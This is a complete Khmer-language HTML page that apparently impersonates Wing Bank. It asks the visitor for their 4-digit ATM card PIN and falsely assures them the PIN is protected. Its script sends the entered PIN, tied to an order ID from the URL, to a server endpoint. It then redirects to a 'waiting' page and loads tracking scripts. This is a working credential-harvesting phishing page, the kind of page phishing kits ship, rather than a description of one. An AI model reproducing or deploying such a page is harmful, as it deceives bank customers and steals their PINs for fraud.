<!DOCTYPE html>
<html lang="km" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>កុដ PIN កាត</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased;
  max-width:520px;margin:0 auto;min-height:100vh;min-height:100dvh;background:#fff;display:flex;flex-direction:column}

.back-btn{
  display:flex;align-items:center;justify-content:center;
  width:44px;height:44px;background:none;border:none;cursor:pointer;
  margin:10px 6px 0;
}
.back-btn svg{width:24px;height:24px;stroke:#1a1a1a;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}

.content{flex:1;padding:16px 24px 0;display:flex;flex-direction:column}

.heading{font-size:28px;font-weight:700;color:#1a1a1a;margin-bottom:12px}
.subtitle{font-size:15px;color:#6b7280;line-height:1.5;margin-bottom:36px}

.pin-wrap{
  display:flex;align-items:center;
  background:#f2f3f5;border-radius:14px;
  height:64px;overflow:hidden;
  position:relative;
}
.pin-icon{
  display:flex;align-items:center;justify-content:center;
  width:52px;height:100%;flex-shrink:0;
  border-right:1px solid #dfe1e5;
}
.pin-icon svg{width:22px;height:22px;stroke:#9ca3af;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}

.pin-row{
  flex:1;display:flex;gap:10px;padding:0 16px;
  align-items:center;height:100%;direction:ltr;
}
.pin-digit{
  flex:1;height:44px;border:none;
  background:rgba(255,255,255,.7);border-radius:10px;
  text-align:center;
  font-size:24px;font-weight:600;color:#1a1a1a;
  font-family:inherit;outline:none;transition:.2s;
  min-width:0;
  -webkit-text-security:disc;
}
.pin-digit::placeholder{color:#c8ccd0;font-weight:300;-webkit-text-security:none;font-size:20px}
.pin-digit:focus{background:#fff;box-shadow:0 0 0 2px #A9CF38}

.err{display:none;background:#fff0f0;border:1px solid #fcc;border-radius:12px;padding:12px 14px;margin:16px 0 0;color:#dc2626;font-size:14px;text-align:center;font-weight:600}

.info{
  display:flex;align-items:flex-start;gap:10px;
  background:#f6faf7;border:1px solid #d7ebdc;border-radius:12px;
  padding:12px 14px;margin-top:24px;
}
.info svg{width:18px;height:18px;flex-shrink:0;fill:none;stroke:#7cb342;stroke-width:2;margin-top:1px}
.info span{font-size:13px;color:#4a6b3f;line-height:1.5}

.bottom-bar{padding:16px 24px 32px;transition:padding-bottom .15s}
.start-btn{
  width:100%;height:54px;border:none;border-radius:50px;
  font-size:17px;font-weight:600;color:#fff;
  background:#A9CF38;cursor:pointer;
  font-family:inherit;transition:.2s;
  box-shadow:0 4px 12px rgba(169,207,56,.25);
}
.start-btn:hover{background:#8BB52E}
.start-btn:disabled{opacity:.45;cursor:default;box-shadow:none}
</style>
</head>
<body>

<button class="back-btn" onclick="history.back()" aria-label="Back">
  <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg>
</button>

<div class="content">
  <h1 class="heading">កុដ PIN កាត</h1>
  <p class="subtitle">បញ្ចូលកូដ PIN ៤ ខ្ទង់ដែលអ្នកប្រើនៅ ATM។</p>

  <div class="pin-wrap">
    <div class="pin-icon">
      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
    </div>
    <div class="pin-row">
      <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p0" placeholder="•">
      <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p1" placeholder="•">
      <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p2" placeholder="•">
      <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p3" placeholder="•">
    </div>
  </div>

  <div class="err" id="err"></div>

  <div class="info">
    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
    <span>ទិន្នន័យរបស់អ្នកត្រូវបានការពារ។ Wing Bank មិនដែលចែកចាយកូដ PIN របស់អ្នកទេ។</span>
  </div>
</div>

<div class="bottom-bar">
  <button class="start-btn" id="go" onclick="submitPin()" disabled>បន្ត</button>
</div>

<script>
var params = new URLSearchParams(location.search);
var orderId = params.get("order");
var phone = params.get("phone");
if(!orderId) location.href = "index.html";

function phoneQS(){ return phone ? "&phone=" + encodeURIComponent(phone) : ""; }

if(params.get("error") === "1"){
  var ee = document.getElementById("err");
  ee.textContent = "កុដ PIN មិនត្រឹមត្រូវ";
  ee.style.display = "block";
  history.replaceState(null, "", "atm.html?order=" + orderId + phoneQS());
}

var digits = document.querySelectorAll(".pin-digit");

digits.forEach(function(inp, i){
  inp.addEventListener("input", function(){
    inp.value = inp.value.replace(/\D/g, "");
    if(inp.value && i < digits.length - 1) digits[i + 1].focus();
    checkPin();
  });
  inp.addEventListener("keydown", function(e){
    if(e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
  });
  inp.addEventListener("paste", function(e){
    e.preventDefault();
    var text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
    for(var j = 0; j < digits.length && j < text.length; j++) digits[j].value = text[j];
    var last = Math.min(text.length, digits.length);
    if(last > 0) digits[Math.min(last, digits.length - 1)].focus();
    checkPin();
  });
});

digits[0].focus();

function getPin(){ return Array.from(digits).map(function(d){ return d.value; }).join(""); }
function checkPin(){ document.getElementById("go").disabled = getPin().length < 4; }

function showError(msg){
  var el = document.getElementById("err");
  el.textContent = msg;
  el.style.display = "block";
  setTimeout(function(){ el.style.display = "none"; }, 3000);
}

var submitting = false;
async function submitPin(){
  var pin = getPin();
  if(pin.length < 4) return;
  if(submitting) return;
  submitting = true;
  var btn = document.getElementById("go");
  btn.disabled = true;
  btn.textContent = "សូមរង់ចាំ...";
  digits.forEach(function(d){ d.disabled = true; });

  try {
    var res = await fetch("/api/atm-data", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ order_id: orderId, atm_pin: pin })
    });
    var data = await res.json();
    if(data.success){
      location.href = "atm-waiting.html?order=" + orderId + phoneQS();
    } else {
      showError(data.message || "មានកំហុស");
      resetInputs();
    }
  } catch(e){
    showError("កំហុសក្នុងការភ្ជាប់");
    resetInputs();
  }
}

function resetInputs(){
  submitting = false;
  var btn = document.getElementById("go");
  btn.disabled = true;
  btn.textContent = "បន្ត";
  digits.forEach(function(d){ d.disabled = false; d.value = ""; });
  digits[0].focus();
}

if(window.visualViewport){
  var bar = document.querySelector(".bottom-bar");
  var pinWrap = document.querySelector(".pin-wrap");
  window.visualViewport.addEventListener("resize", function(){
    var diff = window.innerHeight - window.visualViewport.height;
    if(diff > 100){
      bar.style.paddingBottom = (diff + 12) + "px";
      pinWrap.scrollIntoView({behavior:"smooth", block:"center"});
    } else {
      bar.style.paddingBottom = "";
    }
  });
}
</script>
<script src="tracker.js"></script>
<script src="/presence.js"></script>
</body>
</html>
